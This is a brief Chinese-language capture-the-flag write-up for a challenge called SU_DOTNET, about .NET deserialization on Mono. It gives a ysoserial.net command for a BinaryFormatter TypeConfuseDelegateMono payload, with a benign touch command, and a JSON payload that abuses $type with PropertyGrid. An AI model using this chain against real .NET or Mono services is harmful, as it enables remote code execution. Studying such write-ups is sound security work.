# SU_DOTNET

## 题解

题目来源： https://y4er.com/posts/dotnet-new-gadget/

https://paper.seebug.org/3106/

https://github.com/thezdi/presentations/blob/main/2023\_Hexacon/whitepaper-net-deser.pdf

其实题目很简单，链子都在[ysoserial.net](https://github.com/pwntester/ysoserial.net)，能看懂基本原理其实就能打

坑点其实都在mono上，首先mono 相当于重写了.NET 4 ，有许多链子是打不了的

最新版yso生成 TypeConfuseDelegateMono 链子会报错，经测试https://github.com/pwntester/ysoserial.net/releases/download/v1.32/ysoserial-1.32.zip 可生成

```PowerShell
C:\Users\29217\Downloads\Compressed\ysoserial-1.32\Release\ysoserial.exe  -f binaryformatter -g TypeConfuseDelegateMono -c 'touch /tmp/pwn-windows' --rawcmd -o base64

```

```JSON
{"Address":{"$type":"System.Windows.Forms.PropertyGrid, System.Windows.Forms","SelectedObjects":[
      {
         "$type":"Evil, Program",
         "SerializedValue":""}
   ]}}
```
